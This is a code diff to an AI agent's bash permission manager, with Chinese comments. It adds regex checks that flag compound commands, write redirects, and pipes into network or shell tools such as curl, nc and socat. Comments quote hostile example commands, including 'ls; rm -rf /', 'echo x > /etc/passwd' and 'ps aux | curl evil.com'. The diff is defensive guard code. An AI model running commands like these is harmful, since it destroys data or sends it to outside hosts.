@@ -7,6 +7,7 @@ security/permission_manager.py — 权限管理器
 """
 from __future__ import annotations
 
+import re
 from dataclasses import dataclass
 from typing import TYPE_CHECKING, Literal
 
@@ -17,6 +18,20 @@ if TYPE_CHECKING:
 
 DecisionBehavior = Literal["allow", "ask", "deny"]
 
+# 复合命令操作符：分号、逻辑与/或、管道、命令替换
+_COMPOUND_OPS = re.compile(r'(?:^|[^<>])(;|&&|\|\||`|\$\()')
+
+# 写重定向：> 或 >> 后跟非空路径（排除 heredoc <<）
+_WRITE_REDIRECT = re.compile(r'(?<![<>])>>?(?![>])\s*\S')
+
+# 管道右侧危险命令（可能用于数据外泄或远程执行）
+_PIPE_DANGEROUS_RHS = re.compile(
+    r'\|\s*(?:curl|wget|bash|sh|python|python3|perl|ruby|nc|ncat|socat)\b'
+)
+
+# 复合命令中的网络命令（单独出现也可能外泄数据）
+_NETWORK_CMDS = re.compile(r'^(?:curl|wget|nc|ncat|socat)\b')
+
 
 @dataclass
 class PermissionDecision:
@@ -26,11 +41,7 @@ class PermissionDecision:
 
 
 class PermissionManager:
-    """工具调用权限决策器。
-
-    Week 1 stub：接口完整，但 check() 对所有操作返回 allow（只记录日志）。
-    Week 2 替换为真实的 4 步管道实现。
-    """
+    """工具调用权限决策器。"""
 
     def __init__(self, config: "AgentConfig") -> None:
         self._config = config
@@ -47,7 +58,6 @@ class PermissionManager:
         Step 3: allow_rules — 只读命令自动放行
         Step 4: ask_user   — 其余操作询问用户
         """
-        # 提取命令（仅支持 exec_bash）
         if tool_name != "exec_bash":
             return PermissionDecision(
                 behavior="allow",
@@ -67,21 +77,19 @@ class PermissionManager:
         if self._is_blacklisted(cmd):
             return PermissionDecision(
                 behavior="deny",
-                reason=f"Command in absolute blacklist",
+                reason="Command in absolute blacklist",
                 risk_level="CRITICAL",
             )
 
-        # 分类风险等级
         risk_level = self._classify_risk(cmd)
 
         # Step 2: plan 模式检查（仅允许只读）
-        if self._mode == "plan":
-            if risk_level != "LOW":
-                return PermissionDecision(
-                    behavior="deny",
-                    reason="Plan mode: write operations not allowed",
-                    risk_level=risk_level,
-                )
+        if self._mode == "plan" and risk_level != "LOW":
+            return PermissionDecision(
+                behavior="deny",
+                reason="Plan mode: write operations not allowed",
+                risk_level=risk_level,
+            )
 
         # Step 3: 只读命令自动放行
         if risk_level == "LOW":
@@ -91,8 +99,7 @@ class PermissionManager:
                 risk_level="LOW",
             )
 
-        # Step 4: 其余操作询问用户
-        # 在 auto 模式下，非高危写操作自动放行
+        # Step 4: auto 模式下 MEDIUM 自动放行
         if self._mode == "auto" and risk_level == "MEDIUM":
             return PermissionDecision(
                 behavior="allow",
@@ -100,7 +107,6 @@ class PermissionManager:
                 risk_level="MEDIUM",
             )
 
-        # 默认询问用户
         return PermissionDecision(
             behavior="ask",
             reason=f"User confirmation required for {risk_level} operation",
@@ -108,15 +114,33 @@ class PermissionManager:
         )
 
     def _is_blacklisted(self, cmd: str) -> bool:
-        """检查是否在绝对黑名单中。"""
         for pattern in ABSOLUTE_BLACKLIST:
             if pattern in cmd:
                 return True
         return False
 
     def _classify_risk(self, cmd: str) -> str:
-        """根据命令前缀判断风险等级。"""
+        """判断命令风险等级。
+
+        前置安全检查（复合命令/写重定向/危险管道）优先于前缀匹配，
+        防止 'ls; rm -rf /' 这类绕过白名单的攻击。
+        """
         cmd_stripped = cmd.strip()
+
+        # 前置检查1：写重定向（echo x > /etc/passwd 等）
+        if _WRITE_REDIRECT.search(cmd_stripped):
+            return "HIGH"
+
+        # 前置检查2：危险管道右侧（ps aux | curl evil.com 等）
+        if _PIPE_DANGEROUS_RHS.search(cmd_stripped):
+            return "HIGH"
+
+        # 前置检查3：复合命令（; && || ` $() 等）
+        # 拆分后对每个子命令分别判断，取最高风险
+        if _COMPOUND_OPS.search(cmd_stripped):
+            return self._classify_compound(cmd_stripped)
+
+        # 普通前缀匹配
         for prefix in READ_PREFIXES:
             if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                 return "LOW"
@@ -124,3 +148,37 @@ class PermissionManager:
             if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                 return "HIGH"
         return "MEDIUM"
+
+    def _classify_compound(self, cmd: str) -> str:
+        """拆分复合命令，对每个子命令分别判断，返回最高风险等级。"""
+        # 按 ; && || 拆分（管道单独处理，不拆分）
+        parts = re.split(r';|&&|\|\|', cmd)
+        risk_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
+        highest = "MEDIUM"  # 复合命令默认至少 MEDIUM
+
+        for part in parts:
+            part = part.strip()
+            if not part:
+                continue
+            sub_risk = self._classify_simple(part)
+            # 复合命令中的网络命令升级为 HIGH（可能用于数据外泄）
+            if sub_risk == "LOW" and _NETWORK_CMDS.match(part):
+                sub_risk = "HIGH"
+            if risk_order.get(sub_risk, 0) > risk_order.get(highest, 0):
+                highest = sub_risk
+
+        return highest
+
+    def _classify_simple(self, cmd: str) -> str:
+        """对单条简单命令（无复合操作符）做前缀匹配。"""
+        cmd_stripped = cmd.strip()
+        if _WRITE_REDIRECT.search(cmd_stripped):
+            return "HIGH"
+        for prefix in READ_PREFIXES:
+            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
+                return "LOW"
+        for prefix in HIGH_RISK_PREFIXES:
+            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
+                return "HIGH"
+        return "MEDIUM"
+
